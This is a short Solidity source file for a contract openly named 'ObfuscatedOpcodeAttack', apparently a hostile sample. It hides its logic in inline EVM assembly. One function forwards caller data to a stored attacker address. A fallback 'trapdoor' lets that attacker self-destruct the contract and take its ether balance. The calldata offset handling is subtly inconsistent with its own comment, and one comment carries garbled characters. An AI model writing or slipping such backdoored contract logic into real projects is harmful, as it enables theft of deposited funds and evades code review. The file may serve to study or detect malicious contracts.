// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

/// @title ObfuscatedOpcodeAttack - Logic is hidden inside raw EVM
contract ObfuscatedOpcodeAttack {
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function execute(bytes calldata payload) external {
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0x44, calldatasize()) // skip function selector
            let result := call(gas(), sload(attacker.slot), 0, ptr, calldatasize(), 0, 0)
            if iszero(result) { revert(0, 0) }
        }
    }

    fallback() external payable {
        // üëÅ Assembly-only fallback for trapdoor logic
        assembly {
            if eq(caller(), sload(attacker.slot)) {
                selfdestruct(sload(attacker.slot))
            }
        }
    }

    receive() external payable {}
}
